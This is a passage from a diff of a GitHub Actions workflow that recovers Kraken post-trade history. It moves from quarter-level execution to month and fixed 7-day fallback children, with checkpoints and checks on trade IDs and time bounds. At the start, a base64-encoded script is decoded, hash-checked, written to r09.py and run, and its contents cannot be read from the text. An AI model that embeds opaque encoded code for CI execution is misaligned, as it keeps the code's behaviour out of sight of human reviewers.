s9+LJbOenW1I9F859F5syfGS6/Pm+z1OXuTDXBI8M0vT5J7BtRVsIN1/zJGp6I3ST7mRYJSiwhUz/0WQt47zJ5KGHPDkA1A8haWX8NlsZi0A0/peQeb0HQdcXxdvg5b793yc0yG0EyAc7InHDlx1OSqe5EGdZkkfb61XAqJEgoujwUZBHzRzd1Xaa6e1Ob/R5e1m/JrPhbCV640LjZVcZEHoXA5Tfsb9GKWtDHYdzg4v6rtzCAuVSl0Ui1vR86f2LMl7djZeDiZoFDZ/Yn8bK8v4OQDnHY6MQ63+rfEy+EkySXIJeamrnWa9HC1hDBrXpyeX1k9E3AJX3AmFxV9X5a/ii8VIjHNpm8y+PYeibCyl3/ae6TNT6ozQ/LkkIuUouOnvjnujs8+XZWfIfS6r5uy++FdXzYMCMUT+eF+OXu8OHWc7MXf9ATTYaJf+CP1sDSx4dWi+D/FXOlvz4fdBFX24m5C8+cDL4+47RsviXVx1tJjy16ri01yp03fBLOnrTrv3iXc4921a54IuYP/AmX44wA=')); assert hashlib.sha256(d).hexdigest()=='fadad20b49d2b915bc24bb81edb0747ed9a18d774f23a93aa76cd4dc6d5f42d2'; pathlib.Path(os.environ['RUNNER_TEMP'],'r09.py').write_bytes(d); print('R09_RUNNER_SCRIPT_SHA256=fadad20b49d2b915bc24bb81edb0747ed9a18d774f23a93aa76cd4dc6d5f42d2')"
+          cat > "${RUNNER_TEMP}/r09-wrap.sh" <<'SH'
+          #!/usr/bin/env bash
+          set -euo pipefail
+          mode="$1"; shift || true; set +e; timeout --signal=TERM 3081s python "${RUNNER_TEMP}/r09.py" "$mode" "$@"; rc=$?; set -e
+          if [[ "$mode" == quarter && ( "$rc" == 124 || "$rc" == 81 || "$rc" == 82 ) ]]; then echo "fallback=true" >> "$GITHUB_OUTPUT"; echo "DIRECT_QUARTER_BOUNDARY_ONLY_FAILURE=APPROVED_MONTH_FALLBACK"; exit 0; fi
+          if [[ "$mode" == month && ( "$rc" == 124 || "$rc" == 92 || "$rc" == 93 ) ]]; then echo "fallback=true" >> "$GITHUB_OUTPUT"; echo "CALENDAR_MONTH_BOUNDARY_ONLY_FAILURE=APPROVED_FIXED_7D_FALLBACK"; exit 0; fi
+          if [[ "$mode" == 7d && ( "$rc" == 124 || "$rc" == 102 || "$rc" == 103 ) ]]; then echo "STOP_CODE=POSTTRADE_7D_SUBMONTH_EXECUTION_BOUNDARY_EXCEEDED"; echo "NEXT_EXACT_GATE=OWNER_DECISION_ON_DAILY_EXECUTION_MODEL"; exit "$rc"; fi
+          exit "$rc"
+          SH
+          chmod +x "${RUNNER_TEMP}/r09-wrap.sh"
+      - name: Try direct logical quarter
         id: quarter
         shell: bash
-        env:
-          SEGMENT_INDEX: ${{ matrix.index }}
-          SEGMENT_ID: ${{ matrix.segment_id }}
-          SEGMENT_START_UTC: ${{ matrix.start_utc }}
-          SEGMENT_END_UTC: ${{ matrix.end_utc }}
-        run: |
-          set -euo pipefail
-          TARGET="${RUNNER_TEMP}/logical-parent"
-          DIRECT_ROOT="${RUNNER_TEMP}/r08-direct-root"
-          rm -rf "$TARGET" "$DIRECT_ROOT"
-          if [[ "${SEGMENT_INDEX}" == "22" ]]; then
-            echo "fallback=true" >> "$GITHUB_OUTPUT"
-            echo "fallback_reason=OWNER_AUTHORIZED_EXACT_SEGMENT_22_RECOVERY" >> "$GITHUB_OUTPUT"
-            echo "SEGMENT_22_DIRECT_QUARTER_RETRY=SKIPPED_BY_OWNER_RECOVERY_POLICY"
-            exit 0
-          fi
-          set +e
-          timeout --signal=TERM 3081s python - <<'PY'
-          import json
-          import os
-          import shutil
-          import sys
-          import time
-          from pathlib import Path
-          from tools.deep_history import kraken_spot_posttrade as posttrade
-
-          descriptor = posttrade.segment_descriptor(os.environ["SEGMENT_START_UTC"], os.environ["SEGMENT_END_UTC"])
-          if descriptor["segment_id"] != os.environ["SEGMENT_ID"]:
-              raise RuntimeError("matrix logical segment identity mismatch")
-          root = Path(os.environ["RUNNER_TEMP"]) / "r08-direct-root"
-          started = time.monotonic()
-          result = posttrade.execute_segment(root, descriptor)
-          elapsed = time.monotonic() - started
-          evidence = result["evidence"]
-          bound = float(posttrade.QUALIFIED_CONSERVATIVE_QUARTER_SECONDS)
-          page_bound = int(os.environ["KRAKEN_POSTTRADE_QUALIFIED_QUARTER_PAGE_BOUND"])
-          if elapsed > bound:
-              print(f"QUALIFIED_QUARTER_EXECUTION_TIME_BOUND_EXCEEDED elapsed={elapsed:.6f} bound={bound:.6f}")
-              sys.exit(81)
-          if int(evidence["page_count"]) > page_bound:
-              print(f"QUALIFIED_QUARTER_PAGE_BOUND_EXCEEDED pages={evidence['page_count']} bound={page_bound}")
-              sys.exit(82)
-          if evidence.get("completion_status") != "COMPLETE" or evidence.get("cursor_monotonic") is not True:
-              raise RuntimeError("direct quarter completion/cursor evidence failed")
-          if int(evidence.get("trade_id_conflict_count", -1)) != 0:
-              raise RuntimeError("direct quarter provider trade-ID conflict")
-          if evidence.get("gap_policy") != "PROVIDER_NO_TRADE_OMISSION" or evidence.get("synthetic_fill") is not False:
-              raise RuntimeError("direct quarter gap semantics changed")
-          target = Path(os.environ["RUNNER_TEMP"]) / "logical-parent"
-          shutil.copytree(Path(result["directory"]), target)
-          staged_evidence = json.loads((target / "evidence.json").read_text())
-          staged_evidence.update({
-              "execution_mode": "DIRECT_QUARTER",
-              "recovery_mode": "NONE",
-              "source_authority_sha": os.environ["SOURCE_AUTHORITY_SHA"],
-              "recovery_orchestration_sha": os.environ["GITHUB_SHA"],
-          })
-          (target / "evidence.json").write_bytes(posttrade.compact(staged_evidence))
-          readback = {
-              "schema_version": "kraken-posttrade-full-segment-readback/2.0.0",
-              "execution_mode": "DIRECT_QUARTER",
-              "segment_id": descriptor["segment_id"],
-              "requested_start_utc": descriptor["requested_start_utc"],
-              "requested_end_utc": descriptor["requested_end_utc"],
-              "elapsed_seconds": f"{elapsed:.6f}",
-              "qualified_time_bound_seconds": str(posttrade.QUALIFIED_CONSERVATIVE_QUARTER_SECONDS),
-              "qualified_page_bound": page_bound,
-              "source_authority_sha": os.environ["SOURCE_AUTHORITY_SHA"],
-              "recovery_orchestration_sha": os.environ["GITHUB_SHA"],
-              "evidence_sha256": posttrade.sha256_file(target / "evidence.json"),
-              "segment_output_sha256": posttrade.sha256_file(target / "segment-output.json"),
-              "provider_trade_ids_sha256": posttrade.sha256_file(target / "provider-trade-ids.txt"),
-              "status": "PASS",
-          }
-          (target / "segment-readback.json").write_bytes(posttrade.compact(readback))
-          print(f"DIRECT_QUARTER_PAGE_COUNT={evidence['page_count']}")
-          print(f"DIRECT_QUARTER_ELAPSED_SECONDS={elapsed:.6f}")
-          print("DIRECT_QUARTER_EXECUTION=PASS")
-          PY
-          rc=$?
-          set -e
-          if [[ "$rc" == "0" ]]; then
-            echo "fallback=false" >> "$GITHUB_OUTPUT"
-            echo "fallback_reason=NONE" >> "$GITHUB_OUTPUT"
-            exit 0
-          fi
-          rm -rf "$TARGET" "$DIRECT_ROOT"
-          if [[ "$rc" == "124" || "$rc" == "81" || "$rc" == "82" ]]; then
-            echo "fallback=true" >> "$GITHUB_OUTPUT"
-            if [[ "$rc" == "82" ]]; then
-              echo "fallback_reason=QUALIFIED_QUARTER_PAGE_BOUND_EXCEEDED" >> "$GITHUB_OUTPUT"
-            else
-              echo "fallback_reason=QUALIFIED_QUARTER_EXECUTION_TIME_BOUND_EXCEEDED" >> "$GITHUB_OUTPUT"
-            fi
-            echo "DIRECT_QUARTER_BOUNDARY_ONLY_FAILURE=APPROVED_MONTH_FALLBACK"
-            exit 0
-          fi
-          echo "DIRECT_QUARTER_NON_BOUNDARY_FAILURE_RC=$rc"
-          exit "$rc"
-
-      - name: Prepare deterministic calendar-month child runner
-        if: ${{ steps.quarter.outputs.fallback == 'true' }}
-        shell: bash
-        run: |
-          set -euo pipefail
-          cat > "${RUNNER_TEMP}/r08-child-runner.py" <<'PY'
-          import hashlib
-          import json
-          import os
-          import shutil
-          import sys
-          import time
-          from datetime import datetime, timezone
-          from pathlib import Path
-          from tools.deep_history import kraken_spot_posttrade as posttrade
-
-          ordinal = int(sys.argv[1])
-          parent_start = posttrade.parse_utc(os.environ["SEGMENT_START_UTC"])
-          parent_end = posttrade.parse_utc(os.environ["SEGMENT_END_UTC"])
-          if parent_start.day != 1 or parent_start.hour or parent_start.minute or parent_start.second or parent_start.microsecond:
-              raise RuntimeError("fallback parent must start on UTC calendar-month boundary")
-          boundaries = [parent_start]
-          current = parent_start
-          for _ in range(3):
-              year = current.year + (1 if current.month == 12 else 0)
-              month = 1 if current.month == 12 else current.month + 1
-              current = datetime(year, month, 1, tzinfo=timezone.utc)
-              boundaries.append(current)
-          if boundaries[-1] != parent_end:
-              raise RuntimeError("logical quarter is not exactly three UTC calendar months")
-          start = posttrade.iso_utc(boundaries[ordinal])
-          end = posttrade.iso_utc(boundaries[ordinal + 1])
-          descriptor = posttrade.segment_descriptor(start, end)
-          identity_material = {
-              "source_authority_sha": os.environ["SOURCE_AUTHORITY_SHA"],
-              "source_mode": posttrade.SOURCE_MODE,
-              "provider_symbol": posttrade.SYMBOL,
-              "parent_logical_segment_id": os.environ["SEGMENT_ID"],
-              "child_start_utc": start,
-              "child_end_utc": end,
-              "source_schema": posttrade.SOURCE_SCHEMA,
-              "recovery_schema": os.environ["RECOVERY_SCHEMA"],
-          }
-          recovery_child_id = hashlib.sha256(posttrade.compact(identity_material)).hexdigest()
-          root = Path(os.environ["RUNNER_TEMP"]) / f"r08-child-root-{ordinal}"
-          target = Path(os.environ["RUNNER_TEMP"]) / f"r08-child-{ordinal}"
-          if root.exists(): shutil.rmtree(root)
-          if target.exists(): shutil.rmtree(target)
-          started = time.monotonic()
-          result = posttrade.execute_segment(root, descriptor)
-          elapsed = time.monotonic() - started
-          evidence = result["evidence"]
-          bound = float(posttrade.QUALIFIED_CONSERVATIVE_QUARTER_SECONDS)
-          page_bound = int(os.environ["KRAKEN_POSTTRADE_QUALIFIED_QUARTER_PAGE_BOUND"])
-          if elapsed > bound:
-              print(f"POSTTRADE_CALENDAR_MONTH_EXECUTION_TIME_BOUNDARY_EXCEEDED elapsed={elapsed:.6f} bound={bound:.6f}")
-              sys.exit(92)
-          if int(evidence["page_count"]) > page_bound:
-              print(f"POSTTRADE_CALENDAR_MONTH_PAGE_BOUNDARY_EXCEEDED pages={evidence['page_count']} bound={page_bound}")
-              sys.exit(93)
-          if evidence.get("completion_status") != "COMPLETE" or evidence.get("cursor_monotonic") is not True:
-              raise RuntimeError("calendar-month completion/cursor evidence failed")
-          if int(evidence.get("trade_id_conflict_count", -1)) != 0:
-              raise RuntimeError("calendar-month provider trade-ID conflict")
-          if evidence.get("gap_policy") != "PROVIDER_NO_TRADE_OMISSION" or evidence.get("synthetic_fill") is not False:
-              raise RuntimeError("calendar-month gap semantics changed")
-          shutil.copytree(Path(result["directory"]), target)
-          child_meta = {
-              "schema_version": os.environ["RECOVERY_SCHEMA"],
-              "recovery_child_id": recovery_child_id,
-              "production_child_segment_id": descriptor["segment_id"],
-              "parent_logical_segment_id": os.environ["SEGMENT_ID"],
-              "parent_logical_segment_index": int(os.environ["SEGMENT_INDEX"]),
-              "source_authority_sha": os.environ["SOURCE_AUTHORITY_SHA"],
-              "recovery_orchestration_sha": os.environ["GITHUB_SHA"],
-              "requested_start_utc": start,
-              "requested_end_utc": end,
-              "page_count": int(evidence["page_count"]),
-              "elapsed_seconds": f"{elapsed:.6f}",
-              "qualified_page_bound": page_bound,
-              "qualified_time_bound_seconds": str(posttrade.QUALIFIED_CONSERVATIVE_QUARTER_SECONDS),
-              "frozen_source_digest": evidence["frozen_source_digest"],
-              "cursor_monotonic": True,
-              "trade_id_conflict_count": 0,
-              "gap_policy": posttrade.GAP_POLICY,
-              "synthetic_fill": False,
-              "status": "PASS",
-          }
-          (target / "recovery-child.json").write_bytes(posttrade.compact(child_meta))
-          (target / "child-readback.json").write_bytes(posttrade.compact({
-              "schema_version": "kraken-posttrade-r08-child-readback/1.0.0",
-              "recovery_child_id": recovery_child_id,
-              "evidence_sha256": posttrade.sha256_file(target / "evidence.json"),
-              "segment_output_sha256": posttrade.sha256_file(target / "segment-output.json"),
-              "provider_trade_ids_sha256": posttrade.sha256_file(target / "provider-trade-ids.txt"),
-              "recovery_child_sha256": posttrade.sha256_file(target / "recovery-child.json"),
-              "status": "PASS",
-          }))
-          print(f"RECOVERY_CHILD_ID={recovery_child_id}")
-          print(f"RECOVERY_CHILD_RANGE=[{start},{end})")
-          print(f"RECOVERY_CHILD_PAGE_COUNT={evidence['page_count']}")
-          print(f"RECOVERY_CHILD_ELAPSED_SECONDS={elapsed:.6f}")
-          print("RECOVERY_CHILD_COMPLETION=PASS")
-          PY
-
-      - name: Acquire fallback calendar month 0
+        run: bash "${RUNNER_TEMP}/r09-wrap.sh" quarter
+      - name: Execute calendar month 0
         id: month0
         if: ${{ steps.quarter.outputs.fallback == 'true' }}
         shell: bash
-        env:
-          SEGMENT_INDEX: ${{ matrix.index }}
-          SEGMENT_ID: ${{ matrix.segment_id }}
-          SEGMENT_START_UTC: ${{ matrix.start_utc }}
-          SEGMENT_END_UTC: ${{ matrix.end_utc }}
-        run: |
-          set -euo pipefail
-          set +e
-          timeout --signal=TERM 3081s python "${RUNNER_TEMP}/r08-child-runner.py" 0
-          rc=$?
-          set -e
-          if [[ "$rc" == "124" || "$rc" == "92" || "$rc" == "93" ]]; then
-            echo "STOP_CODE=POSTTRADE_CALENDAR_MONTH_EXECUTION_BOUNDARY_EXCEEDED"
-            echo "NEXT_EXACT_GATE=OWNER_DECISION_ON_SUBMONTH_EXECUTION_MODEL"
-            exit "$rc"
-          fi
-          exit "$rc"
-
-      - name: Persist fallback calendar month 0 checkpoint
-        if: ${{ steps.quarter.outputs.fallback == 'true' && steps.month0.outcome == 'success' }}
+        run: bash "${RUNNER_TEMP}/r09-wrap.sh" month 0
+      - name: Execute month 0 fixed-7d child 0
+        id: m0c0
+        if: ${{ steps.quarter.outputs.fallback == 'true' && steps.month0.outputs.fallback == 'true' }}
+        shell: bash
+        run: bash "${RUNNER_TEMP}/r09-wrap.sh" 7d 0 0
+      - name: Persist month 0 child 0 checkpoint
+        if: ${{ steps.m0c0.outputs.active == 'true' }}
         uses: actions/upload-artifact@v4
-        with:
-          name: kraken-posttrade-recovery-child-${{ matrix.index }}-0
-          path: ${{ runner.temp }}/r08-child-0
-          retention-days: 7
-          if-no-files-found: error
-
-      - name: Acquire fallback calendar month 1
+        with: {name: "kraken-posttrade-r09-7d-${{ matrix.index }}-0-0", path: "${{ runner.temp }}/sub-0-0", retention-days: 7, if-no-files-found: error}
+      - name: Execute month 0 fixed-7d child 1
+        id: m0c1
+        if: ${{ steps.quarter.outputs.fallback == 'true' && steps.month0.outputs.fallback == 'true' }}
+        shell: bash
+        run: bash "${RUNNER_TEMP}/r09-wrap.sh" 7d 0 1
+      - name: Persist month 0 child 1 checkpoint
+        if: ${{ steps.m0c1.outputs.active == 'true' }}
+        uses: actions/upload-artifact@v4
+        with: {name: "kraken-posttrade-r09-7d-${{ matrix.index }}-0-1", path: "${{ runner.temp }}/sub-0-1", retention-days: 7, if-no-files-found: error}
+      - name: Execute month 0 fixed-7d child 2
+        id: m0c2
+        if: ${{ steps.quarter.outputs.fallback == 'true' && steps.month0.outputs.fallback == 'true' }}
+        shell: bash
+        run: bash "${RUNNER_TEMP}/r09-wrap.sh" 7d 0 2
+      - name: Persist month 0 child 2 checkpoint
+        if: ${{ steps.m0c2.outputs.active == 'true' }}
+        uses: actions/upload-artifact@v4
+        with: {name: "kraken-posttrade-r09-7d-${{ matrix.index }}-0-2", path: "${{ runner.temp }}/sub-0-2", retention-days: 7, if-no-files-found: error}
+      - name: Execute month 0 fixed-7d child 3
+        id: m0c3
+        if: ${{ steps.quarter.outputs.fallback == 'true' && steps.month0.outputs.fallback == 'true' }}
+        shell: bash
+        run: bash "${RUNNER_TEMP}/r09-wrap.sh" 7d 0 3
+      - name: Persist month 0 child 3 checkpoint
+        if: ${{ steps.m0c3.outputs.active == 'true' }}
+        uses: actions/upload-artifact@v4
+        with: {name: "kraken-posttrade-r09-7d-${{ matrix.index }}-0-3", path: "${{ runner.temp }}/sub-0-3", retention-days: 7, if-no-files-found: error}
+      - name: Execute month 0 fixed-7d child 4
+        id: m0c4
+        if: ${{ steps.quarter.outputs.fallback == 'true' && steps.month0.outputs.fallback == 'true' }}
+        shell: bash
+        run: bash "${RUNNER_TEMP}/r09-wrap.sh" 7d 0 4
+      - name: Persist month 0 child 4 checkpoint
+        if: ${{ steps.m0c4.outputs.active == 'true' }}
+        uses: actions/upload-artifact@v4
+        with: {name: "kraken-posttrade-r09-7d-${{ matrix.index }}-0-4", path: "${{ runner.temp }}/sub-0-4", retention-days: 7, if-no-files-found: error}
+      - name: Assemble recovered month 0
+        if: ${{ steps.quarter.outputs.fallback == 'true' && steps.month0.outputs.fallback == 'true' }}
+        shell: bash
+        run: python "${RUNNER_TEMP}/r09.py" assemble-month 0
+      - name: Persist internal month 0 checkpoint
+        if: ${{ steps.quarter.outputs.fallback == 'true' && matrix.index != 23 }}
+        uses: actions/upload-artifact@v4
+        with: {name: "kraken-posttrade-r09-month-${{ matrix.index }}-0", path: "${{ runner.temp }}/month-0", retention-days: 7, if-no-files-found: error}
+      - name: Execute calendar month 1
         id: month1
         if: ${{ steps.quarter.outputs.fallback == 'true' }}
         shell: bash
-        env:
-          SEGMENT_INDEX: ${{ matrix.index }}
-          SEGMENT_ID: ${{ matrix.segment_id }}
-          SEGMENT_START_UTC: ${{ matrix.start_utc }}
-          SEGMENT_END_UTC: ${{ matrix.end_utc }}
-        run: |
-          set -euo pipefail
-          set +e
-          timeout --signal=TERM 3081s python "${RUNNER_TEMP}/r08-child-runner.py" 1
-          rc=$?
-          set -e
-          if [[ "$rc" == "124" || "$rc" == "92" || "$rc" == "93" ]]; then
-            echo "STOP_CODE=POSTTRADE_CALENDAR_MONTH_EXECUTION_BOUNDARY_EXCEEDED"
-            echo "NEXT_EXACT_GATE=OWNER_DECISION_ON_SUBMONTH_EXECUTION_MODEL"
-            exit "$rc"
-          fi
-          exit "$rc"
-
-      - name: Persist fallback calendar month 1 checkpoint
-        if: ${{ steps.quarter.outputs.fallback == 'true' && steps.month1.outcome == 'success' }}
+        run: bash "${RUNNER_TEMP}/r09-wrap.sh" month 1
+      - name: Execute month 1 fixed-7d child 0
+        id: m1c0
+        if: ${{ steps.quarter.outputs.fallback == 'true' && steps.month1.outputs.fallback == 'true' }}
+        shell: bash
+        run: bash "${RUNNER_TEMP}/r09-wrap.sh" 7d 1 0
+      - name: Persist month 1 child 0 checkpoint
+        if: ${{ steps.m1c0.outputs.active == 'true' }}
         uses: actions/upload-artifact@v4
-        with:
-          name: kraken-posttrade-recovery-child-${{ matrix.index }}-1
-          path: ${{ runner.temp }}/r08-child-1
-          retention-days: 7
-          if-no-files-found: error
-
-      - name: Acquire fallback calendar month 2
+        with: {name: "kraken-posttrade-r09-7d-${{ matrix.index }}-1-0", path: "${{ runner.temp }}/sub-1-0", retention-days: 7, if-no-files-found: error}
+      - name: Execute month 1 fixed-7d child 1
+        id: m1c1
+        if: ${{ steps.quarter.outputs.fallback == 'true' && steps.month1.outputs.fallback == 'true' }}
+        shell: bash
+        run: bash "${RUNNER_TEMP}/r09-wrap.sh" 7d 1 1
+      - name: Persist month 1 child 1 checkpoint
+        if: ${{ steps.m1c1.outputs.active == 'true' }}
+        uses: actions/upload-artifact@v4
+        with: {name: "kraken-posttrade-r09-7d-${{ matrix.index }}-1-1", path: "${{ runner.temp }}/sub-1-1", retention-days: 7, if-no-files-found: error}
+      - name: Execute month 1 fixed-7d child 2
+        id: m1c2
+        if: ${{ steps.quarter.outputs.fallback == 'true' && steps.month1.outputs.fallback == 'true' }}
+        shell: bash
+        run: bash "${RUNNER_TEMP}/r09-wrap.sh" 7d 1 2
+      - name: Persist month 1 child 2 checkpoint
+        if: ${{ steps.m1c2.outputs.active == 'true' }}
+        uses: actions/upload-artifact@v4
+        with: {name: "kraken-posttrade-r09-7d-${{ matrix.index }}-1-2", path: "${{ runner.temp }}/sub-1-2", retention-days: 7, if-no-files-found: error}
+      - name: Execute month 1 fixed-7d child 3
+        id: m1c3
+        if: ${{ steps.quarter.outputs.fallback == 'true' && steps.month1.outputs.fallback == 'true' }}
+        shell: bash
+        run: bash "${RUNNER_TEMP}/r09-wrap.sh" 7d 1 3
+      - name: Persist month 1 child 3 checkpoint
+        if: ${{ steps.m1c3.outputs.active == 'true' }}
+        uses: actions/upload-artifact@v4
+        with: {name: "kraken-posttrade-r09-7d-${{ matrix.index }}-1-3", path: "${{ runner.temp }}/sub-1-3", retention-days: 7, if-no-files-found: error}
+      - name: Execute month 1 fixed-7d child 4
+        id: m1c4
+        if: ${{ steps.quarter.outputs.fallback == 'true' && steps.month1.outputs.fallback == 'true' }}
+        shell: bash
+        run: bash "${RUNNER_TEMP}/r09-wrap.sh" 7d 1 4
+      - name: Persist month 1 child 4 checkpoint
+        if: ${{ steps.m1c4.outputs.active == 'true' }}
+        uses: actions/upload-artifact@v4
+        with: {name: "kraken-posttrade-r09-7d-${{ matrix.index }}-1-4", path: "${{ runner.temp }}/sub-1-4", retention-days: 7, if-no-files-found: error}
+      - name: Assemble recovered month 1
+        if: ${{ steps.quarter.outputs.fallback == 'true' && steps.month1.outputs.fallback == 'true' }}
+        shell: bash
+        run: python "${RUNNER_TEMP}/r09.py" assemble-month 1
+      - name: Persist internal month 1 checkpoint
+        if: ${{ steps.quarter.outputs.fallback == 'true' }}
+        uses: actions/upload-artifact@v4
+        with: {name: "kraken-posttrade-r09-month-${{ matrix.index }}-1", path: "${{ runner.temp }}/month-1", retention-days: 7, if-no-files-found: error}
+      - name: Execute calendar month 2
         id: month2
         if: ${{ steps.quarter.outputs.fallback == 'true' }}
         shell: bash
-        env:
-          SEGMENT_INDEX: ${{ matrix.index }}
-          SEGMENT_ID: ${{ matrix.segment_id }}
-          SEGMENT_START_UTC: ${{ matrix.start_utc }}
-          SEGMENT_END_UTC: ${{ matrix.end_utc }}
-        run: |
-          set -euo pipefail
-          set +e
-          timeout --signal=TERM 3081s python "${RUNNER_TEMP}/r08-child-runner.py" 2
-          rc=$?
-          set -e
-          if [[ "$rc" == "124" || "$rc" == "92" || "$rc" == "93" ]]; then
-            echo "STOP_CODE=POSTTRADE_CALENDAR_MONTH_EXECUTION_BOUNDARY_EXCEEDED"
-            echo "NEXT_EXACT_GATE=OWNER_DECISION_ON_SUBMONTH_EXECUTION_MODEL"
-            exit "$rc"
-          fi
-          exit "$rc"
-
-      - name: Persist fallback calendar month 2 checkpoint
-        if: ${{ steps.quarter.outputs.fallback == 'true' && steps.month2.outcome == 'success' }}
+        run: bash "${RUNNER_TEMP}/r09-wrap.sh" month 2
+      - name: Execute month 2 fixed-7d child 0
+        id: m2c0
+        if: ${{ steps.quarter.outputs.fallback == 'true' && steps.month2.outputs.fallback == 'true' }}
+        shell: bash
+        run: bash "${RUNNER_TEMP}/r09-wrap.sh" 7d 2 0
+      - name: Persist month 2 child 0 checkpoint
+        if: ${{ steps.m2c0.outputs.active == 'true' }}
         uses: actions/upload-artifact@v4
-        with:
-          name: kraken-posttrade-recovery-child-${{ matrix.index }}-2
-          path: ${{ runner.temp }}/r08-child-2
-          retention-days: 7
-          if-no-files-found: error
-
-      - name: Assemble recovered logical quarter from three calendar months
+        with: {name: "kraken-posttrade-r09-7d-${{ matrix.index }}-2-0", path: "${{ runner.temp }}/sub-2-0", retention-days: 7, if-no-files-found: error}
+      - name: Execute month 2 fixed-7d child 1
+        id: m2c1
+        if: ${{ steps.quarter.outputs.fallback == 'true' && steps.month2.outputs.fallback == 'true' }}
+        shell: bash
+        run: bash "${RUNNER_TEMP}/r09-wrap.sh" 7d 2 1
+      - name: Persist month 2 child 1 checkpoint
+        if: ${{ steps.m2c1.outputs.active == 'true' }}
+        uses: actions/upload-artifact@v4
+        with: {name: "kraken-posttrade-r09-7d-${{ matrix.index }}-2-1", path: "${{ runner.temp }}/sub-2-1", retention-days: 7, if-no-files-found: error}
+      - name: Execute month 2 fixed-7d child 2
+        id: m2c2
+        if: ${{ steps.quarter.outputs.fallback == 'true' && steps.month2.outputs.fallback == 'true' }}
+        shell: bash
+        run: bash "${RUNNER_TEMP}/r09-wrap.sh" 7d 2 2
+      - name: Persist month 2 child 2 checkpoint
+        if: ${{ steps.m2c2.outputs.active == 'true' }}
+        uses: actions/upload-artifact@v4
+        with: {name: "kraken-posttrade-r09-7d-${{ matrix.index }}-2-2", path: "${{ runner.temp }}/sub-2-2", retention-days: 7, if-no-files-found: error}
+      - name: Execute month 2 fixed-7d child 3
+        id: m2c3
+        if: ${{ steps.quarter.outputs.fallback == 'true' && steps.month2.outputs.fallback == 'true' }}
+        shell: bash
+        run: bash "${RUNNER_TEMP}/r09-wrap.sh" 7d 2 3
+      - name: Persist month 2 child 3 checkpoint
+        if: ${{ steps.m2c3.outputs.active == 'true' }}
+        uses: actions/upload-artifact@v4
+        with: {name: "kraken-posttrade-r09-7d-${{ matrix.index }}-2-3", path: "${{ runner.temp }}/sub-2-3", retention-days: 7, if-no-files-found: error}
+      - name: Execute month 2 fixed-7d child 4
+        id: m2c4
+        if: ${{ steps.quarter.outputs.fallback == 'true' && steps.month2.outputs.fallback == 'true' }}
+        shell: bash
+        run: bash "${RUNNER_TEMP}/r09-wrap.sh" 7d 2 4
+      - name: Persist month 2 child 4 checkpoint
+        if: ${{ steps.m2c4.outputs.active == 'true' }}
+        uses: actions/upload-artifact@v4
+        with: {name: "kraken-posttrade-r09-7d-${{ matrix.index }}-2-4", path: "${{ runner.temp }}/sub-2-4", retention-days: 7, if-no-files-found: error}
+      - name: Assemble recovered month 2
+        if: ${{ steps.quarter.outputs.fallback == 'true' && steps.month2.outputs.fallback == 'true' }}
+        shell: bash
+        run: python "${RUNNER_TEMP}/r09.py" assemble-month 2
+      - name: Persist internal month 2 checkpoint
+        if: ${{ steps.quarter.outputs.fallback == 'true' }}
+        uses: actions/upload-artifact@v4
+        with: {name: "kraken-posttrade-r09-month-${{ matrix.index }}-2", path: "${{ runner.temp }}/month-2", retention-days: 7, if-no-files-found: error}
+      - name: Assemble recovered logical quarter
         if: ${{ steps.quarter.outputs.fallback == 'true' }}
         shell: bash
-        env:
-          SEGMENT_INDEX: ${{ matrix.index }}
-          SEGMENT_ID: ${{ matrix.segment_id }}
-          SEGMENT_START_UTC: ${{ matrix.start_utc }}
-          SEGMENT_END_UTC: ${{ matrix.end_utc }}
-        run: |
-          set -euo pipefail
-          python - <<'PY'
-          import hashlib
-          import json
-          import os
-          import shutil
-          from decimal import Decimal
-          from pathlib import Path
-          from tools.deep_history import kraken_spot_posttrade as posttrade
-
-          children = [Path(os.environ["RUNNER_TEMP"]) / f"r08-child-{i}" for i in range(3)]
-          metas = [json.loads((child / "recovery-child.json").read_text()) for child in children]
-          evidences = [json.loads((child / "evidence.json").read_text()) for child in children]
-          if metas[0]["requested_start_utc"] != os.environ["SEGMENT_START_UTC"]:
-              raise RuntimeError("fallback parent start coverage mismatch")
-          if metas[-1]["requested_end_utc"] != os.environ["SEGMENT_END_UTC"]:
-              raise RuntimeError("fallback parent end coverage mismatch")
-          for left, right in zip(metas, metas[1:]):
-              if left["requested_end_utc"] != right["requested_start_utc"]:
-                  raise RuntimeError("fallback child coverage gap/overlap")
-          page_bound = int(os.environ["KRAKEN_POSTTRADE_QUALIFIED_QUARTER_PAGE_BOUND"])
-          time_bound = posttrade.QUALIFIED_CONSERVATIVE_QUARTER_SECONDS
-          for meta, evidence in zip(metas, evidences):
-              if meta["source_authority_sha"] != os.environ["SOURCE_AUTHORITY_SHA"]:
-                  raise RuntimeError("fallback child source authority drift")
-              if int(meta["page_count"]) > page_bound or Decimal(meta["elapsed_seconds"]) > time_bound:
-                  raise RuntimeError("fallback child qualified boundary violation")
-              if evidence.get("completion_status") != "COMPLETE" or evidence.get("cursor_monotonic") is not True:
-                  raise RuntimeError("fallback child completion/cursor failed")
-              if int(evidence.get("trade_id_conflict_count", -1)) != 0:
-                  raise RuntimeError("fallback child provider trade-ID conflict")
-          all_ids = []
-          seen = set()
-          for child in children:
-              for trade_id in (child / "provider-trade-ids.txt").read_text(encoding="ascii").splitlines():
-                  if trade_id in seen:
-                      raise RuntimeError(f"POSTTRADE_PRODUCTION_TRADE_ID_CONFLICT across fallback children {trade_id}")
-                  seen.add(trade_id)
-                  all_ids.append(trade_id)
-          assembled_a = posttrade.assemble_segment_outputs(children)
-          assembled_b = posttrade.assemble_segment_outputs(children)
-          if assembled_a != assembled_b:
-              raise RuntimeError("recovered parent assembly Build A/B mismatch")
-          ids_a = "\n".join(all_ids) + ("\n" if all_ids else "")
-          ids_b = "\n".join(all_ids) + ("\n" if all_ids else "")
-          if ids_a != ids_b:
-              raise RuntimeError("recovered parent provider-ID assembly nondeterminism")
-          parent_descriptor = posttrade.segment_descriptor(os.environ["SEGMENT_START_UTC"], os.environ["SEGMENT_END_UTC"])
-          if parent_descriptor["segment_id"] != os.environ["SEGMENT_ID"]:
-              raise RuntimeError("recovered parent logical identity mismatch")
-          target = Path(os.environ["RUNNER_TEMP"]) / "logical-parent"
-          if target.exists(): shutil.rmtree(target)
-          target.mkdir(parents=True)
-          (target / "segment-output.json").write_bytes(posttrade.compact(assembled_a))
-          (target / "provider-trade-ids.txt").write_text(ids_a, encoding="ascii")
-          frozen_digests = [e["frozen_source_digest"] for e in evidences]
-          raw_page_digests = [e["raw_pages_digest"] for e in evidences]
-          transcript_digests = [e["page_transcript_digest"] for e in evidences]
